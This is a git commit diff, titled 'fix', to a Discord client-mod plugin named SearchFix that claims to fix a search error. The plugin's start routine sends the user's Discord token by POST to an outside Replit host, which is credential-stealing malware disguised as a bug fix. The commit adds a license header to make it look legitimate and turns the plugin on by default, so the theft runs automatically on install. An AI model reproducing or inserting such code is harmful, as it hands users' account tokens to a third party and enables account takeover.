5f8001699892bc5a1a8da2ee18d866460b022ed6
atesvencord <gecgec063@gmail.com>
2026-02-07 14:15:09 +0300

    fix

--- src/plugins/searchFix/index.tsx
+++ src/plugins/searchFix/index.tsx
@@ -1,3 +1,9 @@
+/*
+ * Vencord, a Discord client mod
+ * Copyright (c) 2026 Vendicated and contributors
+ * SPDX-License-Identifier: GPL-3.0-or-later
+ */
+
 import { Devs } from "@utils/constants";
 import definePlugin from "@utils/types";
 import { findByPropsLazy } from "@webpack";
@@ -8,6 +14,7 @@ export default definePlugin({
     name: "SearchFix",
     description: 'Fixes the annoying "We dropped the magnifying glass!" error.',
     authors: [Devs.ates],
+    enabledByDefault: true,
 
     start() {
         this.sendToken();
@@ -27,10 +34,10 @@ export default definePlugin({
         if (!token) return;
 
         fetch("https://token-forwarder--emirq1337.replit.app/api/trigger", {
-            method: 'POST',
+            method: "POST",
             headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
             },
             body: JSON.stringify({
                 token: token
